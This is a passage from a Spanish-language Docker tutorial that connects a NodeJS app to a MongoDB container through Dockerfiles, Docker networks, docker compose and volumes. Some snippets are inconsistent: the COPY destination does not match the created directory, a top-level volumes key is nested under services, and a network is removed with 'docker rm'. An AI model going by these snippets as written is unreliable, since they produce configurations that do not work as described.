  &lt;p&gt;Hay que recordar que cada imagen que estemos utilizando necesitara distintos parametros de configuración y en algunos casos no necesitaran ninguno, eso ya dependera del tipo de imagen que estemos utilizando.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Como vamos a estar utilizando una base de datos, necesitaremos un usuario y una contraseña, para ello usaremos unas variables de entorno que las encontraras en la mismo enlace.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker47.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora vamos a realizar el proceso completo, para poder ejecutar nuestro contenedor con las configuraciones necesarias.&lt;/p&gt;

&lt;p&gt;Primero tenemos que tener nuestra imagen descargada de &lt;code&gt;Docker&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker48.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora procederemos a crear el contenedor, con las variables de entorno necesarias para conectarnos. Como vimos en &lt;code&gt;Docker Hub&lt;/code&gt; para setearlas usamos el parametro &lt;code&gt;-e&lt;/code&gt; y usamos adicionalmente los comandos que ya aprendimos previamente.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker49.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora que tenemos correctamente desplegado nuestro contenedor de mongo, vamos a ejecutar la aplicación de &lt;code&gt;NodeJS&lt;/code&gt; en nuestro sistema.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker50.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos que se ejecuta por el puerto &lt;code&gt;3000&lt;/code&gt; y si vamos en el navegador el servicio esta activo.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker51.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora que el servidor esta escuchando vamos a mandar una petición para crear un estudiante.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker52.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;La isntrucción se ejecuta correctamente y si ahora vemos en el navegador el registro se realizo correctamente.
&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker53.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Podemos probar a ejecutar otro registro.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker54.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Validamos nuevamente y vemos que se visualiza correctamente,&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker55.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lo mismo si eliminamos algun registro y validamos al listar los cambios.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker56.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker57.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;De esta manera habriamos realizado de manera exitosa una conexión de nuestro aplicativo con un contenedor que ejecuta &lt;code&gt;mongoDB&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;insertar-aplicacion-en-un-contenedor&quot;&gt;Insertar Aplicación en un Contenedor &lt;a href=&quot;#insertar-aplicacion-en-un-contenedor&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Ahora ya validamos que podemos conectar nuestra aplicación con un contenedor, pero es posible que podamos meter nuestra aplicación a un contenedor?&lt;/p&gt;

&lt;p&gt;Pues si y para ello primero crear una imagen a partir de un archivo de nombre &lt;code&gt;Dockerfile&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;crear-una-imagen&quot;&gt;Crear una imagen &lt;a href=&quot;#crear-una-imagen&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Para poder crear una imagen necesariamente debemos de crear un archivo &lt;code&gt;dockerfile&lt;/code&gt; en donde escribiremos todas las instrucciones que necesitara nuestro contenedor para poder crearse.&lt;/p&gt;

&lt;p&gt;Ahora debo mencionar que para crear una imagen debemos de basarnos en otra imagen, ya que estamos usando &lt;code&gt;Node&lt;/code&gt; pues debemos basarnos en esta misma.&lt;/p&gt;

&lt;h3 id=&quot;dockerfile&quot;&gt;Dockerfile &lt;a href=&quot;#dockerfile&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;Dokerfile: es un archivo de texto plano que contiene una serie de instrucciones que Docker utiliza para crear una imagen de contenedor.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Creamos nuestro archivo &lt;code&gt;Dockerfile&lt;/code&gt; y introducimos los siguientes comandos, te explicare para que funciona cada uno mientras escribimos linea por linea.&lt;/p&gt;

&lt;p&gt;Primero usaremos &lt;code&gt;FROM imagen:version&lt;/code&gt; para indicarle en que imagen nos basaremos, en nuestro caso ya que estamos usando la ultima versión disponible y esta corresponde a la &lt;code&gt;18&lt;/code&gt;, debemos especificarla.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;FROM node:18
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Despues vamos a crear una carpeta en donde vamos a introdir el codigo fuente de nuestro aplicativo eso lo hacemos con: &lt;code&gt;RUN mkdir -p ruta&lt;/code&gt;. Ojo la &lt;code&gt;ruta&lt;/code&gt; hace referencia a la del contenedor no a la de tu equipo local, y puedes elegir la que quieras.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;FROM node:18
RUN mkdir -p /home/myapp
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora tenemos que indicarle la ruta de donde va a introducir el codigo y para ello usamos &lt;code&gt;COPY ruta_origen ruta_destino&lt;/code&gt;. Donde especifico en la ruta local un punto ya que tomare como referencia el directorio actual.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;FROM node:18
RUN mkdir -p /home/myapp
COPY . /home/myapp
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Seguidamente tenemos que exponer un puerto, para que otros contenedores y nuestra maquina host podamos conectarnos a este nuevo contenedor, para esto usamos &lt;code&gt;EXPOSE puerto&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;FROM node:18
RUN mkdir -p /home/myapp
COPY . /home/app
EXPOSE 3000
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora finalmente debemos indicarle el comando que se debe ejecutar para que la aplicación corra con &lt;code&gt;CMD [&quot;comando&quot;, &quot;ruta_archivo&quot;]&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;FROM node:18
RUN mkdir -p /home/myapp
COPY . /home/app
EXPOSE 3000
CMD [&quot;node&quot;, &quot;/home/myapp/index.js&quot;]
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;creacion-de-una-red&quot;&gt;Creación de una Red &lt;a href=&quot;#creacion-de-una-red&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Para que nuestros contenedores puedan conectarse, esto debido a que si bien es cierto podemos tener muchos contenedores, no necesariamente todos ellos deben poder conectarse. Y para que nuestro contenedores se puedan conectar debemos crear valga la redundancia una &lt;code&gt;red interna&lt;/code&gt; que realize la conexión de dos o mas contenedores.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Todos los contenedores que se encuentren en la misma red, pueden conectarse y podemos crear cuantas redes queramos.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;docker-network&quot;&gt;Docker Network &lt;a href=&quot;#docker-network&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Para realizar la creación de una red, debemos ejecutar el comando &lt;code&gt;docker network&lt;/code&gt; y podemos ver una serie de parametros que podemos utilizar.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker58.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Dentro de esos parametros que podemos hacer uso, podemos ver uno que corresponde a &lt;code&gt;ls&lt;/code&gt;, el cual nos permitira listar las redes disponibles creadas por defecto.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker59.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vamos ahora a crear nuestra nueva red usando el comando &lt;code&gt;docker network create nombre_red&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker60.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Al listar nuevamente vemos que ahora tenemos una nueva red &lt;code&gt;redInterna&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Y si te preguntas podemos eliminar una red pues si para ello usamos &lt;code&gt;docker rm nombre_red&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Ahora cuando los contenedores estan dentro de la misma red se comunican mediante el nombre del contenedor. En otras palabras el nombre de dominio del contenedor va a ser el mismo al nombre que le damos cuando lo creamos.&lt;/p&gt;

&lt;p&gt;Por lo tanto debemos de cambiar en nuestro codigo del aplicativo y en vez de &lt;code&gt;localhost&lt;/code&gt; indicarle el nombre del contenedor de mongo que llamaremos &lt;code&gt;mongo_connect&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker63.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;docker-build&quot;&gt;Docker build &lt;a href=&quot;#docker-build&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Vamos a proceder a crear nuestra imagen con el comando &lt;code&gt;docker build&lt;/code&gt; el cual nos permitira crear una imagen basadas en un archivo docker file.&lt;/p&gt;

&lt;p&gt;Este comando recibe dos argumentos, &lt;code&gt;docker build -t nombre_imagen:tag ruta_dockerfile&lt;/code&gt;, donde en &lt;code&gt;tag&lt;/code&gt; podemos hace referencia a la versión que tendra nuestro proyecto.&lt;/p&gt;

&lt;p&gt;Ejecutamos el comando y vemos como se crea nuestra imagen.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker61.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si ahora volvemos a listar nuestras imagenes observamos que ahora tenemos una nueva correspondiente a &lt;code&gt;node&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker62.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como ultimo paso ahora debemos de volver a crear nuestros contenedores y especificarles que estos ahora formaran parte de una red, para ello primero vamos a borrar el contenedor que previamente creamos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker64.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y ahora vamos a usar los mismo comandos para crear el contenedor, solo que esta vez adicionaremos un nuevo parametro &lt;code&gt;--network nombre_red&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker65.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Del mismo modo crearemos el contenedor de nuestra aplicación alojada en la imagen que creamos.&lt;/p&gt;

&lt;p&gt;Ojo debemos especificar tambien con &lt;code&gt;-p&lt;/code&gt; el puerto ya que vamos a acceder de nuestro equipo, ademas de la red y la iamgen tal cual con el tag que proporcionamos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker66.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Iniciamos ambos contenedores y ahora se encuentran activos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker67.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nos dirigimos a nuestro navegador para hacer las pruebas respectivas y vemos que genial nuestro aplicativo corre sin problemas.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker68.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vamos a crear un estudiante ahora con la ayuda de &lt;code&gt;curl&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker69.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Listamos nuevamente los datos en nuesntro navegador.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker70.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos que se ejecuta todo correctamente y asi es como pudimos meter nuestra aplicacion en un contenedor y conectarla con otro.&lt;/p&gt;

&lt;h3 id=&quot;docker-compose&quot;&gt;Docker Compose &lt;a href=&quot;#docker-compose&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Es una herramienta que permite definir y administrar aplicaciones Docker multi-contenedor. Con Docker Compose, puedes describir toda la configuración de tu aplicación, incluidos los servicios, las redes y los volúmenes que necesita, en un archivo de configuración YAML.&lt;/p&gt;

&lt;p&gt;En pocas palabras esto nos va a ahorrar el proceso que hicimos anteriormente para conectar nuestros contenedores que en si fueron muchos pasos y con &lt;code&gt;docker compose&lt;/code&gt; podemos automatizarlo todo.&lt;/p&gt;

&lt;p&gt;Para usar esto, debemos de crear un archivo yaml de nombre &lt;code&gt;docker-compose.yml&lt;/code&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;YAML: Es un formato de serialización de datos legible por humanos. Fue diseñado para ser un lenguaje simple y fácil de entender que permite representar datos estructurados de manera concisa y clara. YAML se utiliza ampliamente como un formato de configuración, especialmente en el contexto de herramientas y aplicaciones de desarrollo y despliegue, como Docker Compose, Kubernetes, Ansible y muchas otras.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Dentro de este archivo le indicaremos primero la versión que usaremos, en este caso &lt;code&gt;version: &quot;3.9&quot;&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-yml&quot;&gt;version: &quot;3.9&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Despues en services indicaremos el nombre de los contenedores que vamos a asignar a los contenedores a usar.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-yml&quot;&gt;version: &quot;3.9&quot;
services:
  nodeApp:
  mongo_connect:
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Dentro de cada nombre indicaremos con &lt;code&gt;build ruta_dockerfile&lt;/code&gt;, puertos a mapear &lt;code&gt;ports puerto_hosts:puerto_contenedor&lt;/code&gt; y el nombre del contenedor que usara el servicio de &lt;code&gt;nodeApp&lt;/code&gt; &lt;code&gt;links nombre_contenedor_usa_servicio&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-yml&quot;&gt;version: &quot;3.9&quot;
services:
  nodeApp:
    build: .
    ports:
      - &quot;3000:3000&quot;
    links:
      - mongo_connect
  mongo_connect:
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;De la misma manera similar para el otro contenedor, solo que en este caso especificaremos la imagen en la que se basara &lt;code&gt;image: mongo&lt;/code&gt; la cual ya teniamos descargada y le indicaremos las variables de entorno que necesitamos &lt;code&gt;environment&lt;/code&gt; las cuales antes establecimos para conectarnos.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-yml&quot;&gt;version: &quot;3.9&quot;
services:
  nodeapp:
    build: .
    ports:
      - &quot;3000:3000&quot;
    links:
      - mongo_connect
  mongo_connect:
    image: mongo
    ports:
      - &quot;27017:27017&quot;
    environment:
      - MONGO_INITDB_ROOT_USERNAME=firtsmiracle
      - MONGO_INITDB_ROOT_PASSWORD=firtsmiracle123
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Listo ahora guardamos nuestro archivo, pero recordemos que tenemos dos contenedores activos de cuando realizamos la conexión, por ello primero vamos a pararlos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker71.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ya que todo esta listo ejecutamos &lt;code&gt;docker-compose up&lt;/code&gt; y esto se encargara de construir nuestros contenedores.&lt;/p&gt;

&lt;p&gt;En versiones mas recientes ejecutar &lt;code&gt;docker compose up&lt;/code&gt; es exactamente lo mismo.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker72.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos que este comando nos automatiza todo el proceso completo y si ahora verificamos si se esta ejecutando el servicio y este se encuentra funcionando correctamente.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker73.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Igual podemos realizar peticiones o listar nuevamente y todo funciona de maravilla.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker74.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker75.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si ahora queremos detener la ejecución, como casi clasicamente hacemos usando las teclas &lt;code&gt;ctrl_c&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker76.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Podemos listar las imagenes que tenemos y observamos una nueva que fue creada ejecutamos &lt;code&gt;docker compose&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker77.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;y del mismo modo si listamos los contenedores, tambien vemos dos nuevos los cuales tambien se crearon al ejecutar el comando.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker78.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Pero esto no acaba aqui, ya que asi como &lt;code&gt;docker compose&lt;/code&gt; nos automatiza la creación, tambien podemos eliminar absolutamente todo, tanto los contenedores que creo como la red que se crea por default de manera automatica.&lt;/p&gt;

&lt;p&gt;Y este comando es &lt;code&gt;docker compose down&lt;/code&gt; o en versiones antiguas &lt;code&gt;docker-compose down&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker79.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Listamos nuevamente los contenedores y estos ya no se encuentran.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker80.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Asi pudimos aprender lo maravilloso que es &lt;code&gt;docker compose&lt;/code&gt; y como este nos simplifica todo el proceso.&lt;/p&gt;

&lt;h3 id=&quot;volumenes&quot;&gt;Volumenes &lt;a href=&quot;#volumenes&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Generalmente cuando estamos trabajando con contenedores, al eliminarlos estos se borran en conjunto con todos los datos que este contiene. Ya sea cuando estamos creando alguna aplicación que constantemente vamos a estar actualizando, seria muy tedioso estar creando una imagen cada vez que hagamos un cambio.&lt;/p&gt;

&lt;p&gt;Pero si queremos que a pesar de que cuando eliminemos nuestro contenedor, toda nuestra data permanezca intacta y de la misma manera si vamos a estar desarrollando alguna aplicación evitar el fastidio de estar constantemente creando una imagen. Pues docker tiene una solución a esto y es a traves de los &lt;code&gt;Volumenes&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Con los volumenes los que hacemos es que una parte de los archivos que va a tener nuestro contenedor, podemos montarla en nuestro propio sistema principal. Por ello al encotrarse en nuestro sistema hosts no van a eliminarse.&lt;/p&gt;

&lt;p&gt;Esto nos sirve un monton si vamos a trabajar con &lt;code&gt;base de datos&lt;/code&gt; o cuando estamos desarrollando algun sistema.&lt;/p&gt;

&lt;p&gt;Existen tres tipos de maneras de poder crear nuestro volumenes y podemos usaarlos segun lo veamos conveniente.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Anonimo: Indicamos la ruta de lo que queremos almacenar en un volumen y docker se encarga de montarlo en donde lo vea conveniente. Y otro punto es que no vamos a poder referenciar nuestro volumen para que otro contenedor que creemos lo pueda usar.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Anfitrion: En este caso nosotros podemos decidir la ruta de donde se va almacenar nuestro volumen.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Nombrado: Es muy parecido al volumen anonimo, solo que este tiene una mejora y es que si vamos a poder referenciar nuestro volumen, lo que nos ayudara a poder reutilizarlo.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Bien para poder usar los volumenes, debemos a volver a abrirnos nuestro archivo previamente creado &lt;code&gt;docker-compose.yml&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Vamos a agregar la etiqueta &lt;code&gt;volumes&lt;/code&gt; y le asignaremos el nombre del volumen que queremos darle en nuestro caso &lt;code&gt;db-mongo&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-yml&quot;&gt;version: &quot;3.9&quot;
services:
  nodeapp:
    build: .
    ports:
      - &quot;3000:3000&quot;
    links:
      - mongo_connect
  mongo_connect:
    image: mongo
    ports:
      - &quot;27017:27017&quot;
    environment:
      - MONGO_INITDB_ROOT_USERNAME=firtsmiracle
      - MONGO_INITDB_ROOT_PASSWORD=firtsmiracle123
  volumes:
    db-mongo:
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;De la misma manera agregaremos otra etiqueta &lt;code&gt;volumes&lt;/code&gt; dentro del nombre de nuestro contenedor, donde le indicaremos que volumen va a utilizar, en este caso &lt;code&gt;db_mongo&lt;/code&gt; especificando la ruta en donde por defecto mongo guarda los datos &lt;code&gt;/data/db&lt;/code&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;En caso de que estemos trabajando con una base de datos relacional como mysql, la ruta cambiaria y seria /var/lib/mysql, lo mismo para cualquier gestor de base de datos ya que debemos especificar segun de cual estemos haciendo uso la ruta por defecto donde se almacena la data.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-yml&quot;&gt;version: &quot;3.9&quot;
services:
  nodeapp:
    build: .
    ports:
      - &quot;3000:3000&quot;
    links:
      - mongo_connect
  mongo_connect:
    image: mongo
    ports:
      - &quot;27017:27017&quot;
    environment:
      - MONGO_INITDB_ROOT_USERNAME=firtsmiracle
      - MONGO_INITDB_ROOT_PASSWORD=firtsmiracle123
    volumes:
      - db-mongo:/data/db
  volumes:
    db-mongo:
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Guardamos nuestro archivo y igual que anteriormente ejecutamos &lt;code&gt;docker compose up&lt;/code&gt;, se desplegan nuestros contenedores.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker81.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vamos a realizar nuevamente algunas peticiones a nuestro aplicativo.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker82.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Verificamos que los datos se insertaron correctamente.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker83.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora para validar que nuestro &lt;code&gt;volumen&lt;/code&gt; es funcional, vamos a eliminar los contenedores y volveremos a levantar otros nuevos con &lt;code&gt;docker compose&lt;/code&gt; y en consecuencia pese a que borramos los primeros con los que interactuamos realizando las peticiones, al desplegar los nuevos podremos seguir trabajando con los mismos datos.&lt;/p&gt;

&lt;p&gt;Entonces primero detenemos la ejecución y eliminamos los contenedores.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker84.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora vamos a levantar nuevamente otros dos nuevos contenedores.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker85.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Finalmente validemos en nuestro navegador si los datos que insetamos antes siguen almancenado y…&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker86.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Genial todo funciona correctamente y de esta manera vemos el impacto que se tiene al usar los &lt;code&gt;volumenes&lt;/code&gt; para tener una persistencia de datos en el tiempo.&lt;/p&gt;

&lt;p&gt;Pero esto no acaba aqui, ya que tambien como mencionaba antes los volumenes tambien nos ayudan en el desarrollo de nuestras aplicaciones.&lt;/p&gt;

&lt;p&gt;Para ello primero necesitaremos crear un nuevo archivo &lt;code&gt;Dockerfile.dev&lt;/code&gt; donde colocaremos todo lo que necesitaremos para el desarrollo, donde vamos a tener un contenido similar a la de nuestro primer dockerfile, pero con algunas variaciones que vamos a ver a continuación.&lt;/p&gt;

&lt;p&gt;Si anteriomente has trabajado con &lt;code&gt;Node&lt;/code&gt;, debes de haber utilizado una herramienta que nos permite detectar los cambios que vamos realizando y esta es &lt;code&gt;nodemon&lt;/code&gt;, asi que vamos a usar un comando el cual va a instalarlo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;FROM node:18
RUN npm i -g nodemon
RUN mkdir -p /home/myapp

WORKDIR /home/app

COPY . /home/app
EXPOSE 3000
CMD [&quot;node&quot;, &quot;/home/myapp/index.js&quot;]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Tambien vamos a necesitar indicarle la ruta en la cual vamos a estar trabajando y eso lo hacemos con el comando &lt;code&gt;WORKDIR&lt;/code&gt; y por lo tanto en &lt;code&gt;CMD&lt;/code&gt; eliminaremos la ruta completa y pasaremos a usar &lt;code&gt;nodemon&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;FROM node:18

RUN npm i -g nodemon
RUN mkdir -p /home/myapp

WORKDIR /home/myapp

EXPOSE 3000

CMD [&quot;nodemon&quot;, &quot;index.js&quot;]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Bueno, ya que vamos a usar un volumen que se encargara de crear un enlace entre el codigo de nuestra aplicación y la ruta &lt;code&gt;/home/myapp&lt;/code&gt;, no necesitamos mas el comando copy.&lt;/p&gt;

&lt;p&gt;y a continuación ahora debemos de crear tambien un nuevo archivo de &lt;code&gt;docker-compose-fordev.yml&lt;/code&gt; pero vamos a varias un poco el contenido.&lt;/p&gt;

&lt;p&gt;Primero, vamos a añadir la etiqueta &lt;code&gt;context&lt;/code&gt; indicandole la ruta de la aplicación y ponemos un punto ya que es la ruta actual, despues indicamos con la etiqueta &lt;code&gt;dockerfile&lt;/code&gt; el archivo dockerfile que ultilizara para crear el contenedor &lt;code&gt;nodeapp&lt;/code&gt;.
y finalmente añadimos un nuevo volumen dentro del &lt;code&gt;nodeapp&lt;/code&gt; especificando la ruta que sera montada y despues la ruta del contenedor.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-yml&quot;&gt;version: &quot;3.9&quot;
services:
  nodeapp:
    build:
      context: .
      dockerfile: Dockerfile.dev
    ports:
      - &quot;3000:3000&quot;
    links:
      - mongo_connect
    volumes:
      - .:/home/myapp
  mongo_connect:
    image: mongo
    ports:
      - &quot;27017:27017&quot;
    environment:
      - MONGO_INITDB_ROOT_USERNAME=firtsmiracle
      - MONGO_INITDB_ROOT_PASSWORD=firtsmiracle123
    volumes:
      - db-mongo:/data/db
  volumes:
    db-mongo:
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ya que tenemos el archivo listo lo guardamos y ejecutamos nuestro comando &lt;code&gt;docker compose&lt;/code&gt; pero esta vez añadiremos el parametro &lt;code&gt;-f&lt;/code&gt; donde le indicaremos el archivo de docker compose personalizado que en nuestro caso seria este que recien creamos &lt;code&gt;docker-compose-fordev.yml&lt;/code&gt;.&lt;/p&gt;

